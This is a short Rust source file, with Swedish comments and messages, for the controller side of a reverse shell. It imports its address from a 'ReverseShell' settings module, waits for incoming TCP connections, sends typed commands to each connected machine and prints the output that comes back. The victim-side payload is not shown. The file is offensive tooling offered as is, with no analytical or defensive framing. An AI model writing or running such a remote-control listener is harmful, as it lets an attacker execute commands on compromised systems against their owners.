use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};

use ReverseShell::settings::{IP_ADDRESS, PORT};

fn handle_connection(mut stream: TcpStream) -> io::Result<()> {
    println!("Hanterar anslutning från: {}", stream.peer_addr()?);
    let mut buffer = [0; 1024];
    loop {
        print!("> ");
        io::stdout().flush()?;
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        stream.write_all(input.trim().as_bytes())?;
        let n = stream.read(&mut buffer)?;
        if n == 0 {
            println!("Anslutning bruten.");
            break;
        }
        print!("{}", String::from_utf8_lossy(&buffer[..n]));
        io::stdout().flush()?;
    }
    Ok(())
}

fn main() -> io::Result<()> {
    let address = format!("{}:{}", IP_ADDRESS, PORT);
    let listener = TcpListener::bind(&address)?;
    println!("Lyssnar på {}", address);

    // Lägg till debug för att se om vi ens går in i loopen
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Ny anslutning: {}", stream.peer_addr()?);
                handle_connection(stream)?;
            }
            Err(e) => {
                eprintln!("Fel vid anslutning: {}", e);
            }
        }
    }
    Ok(())
}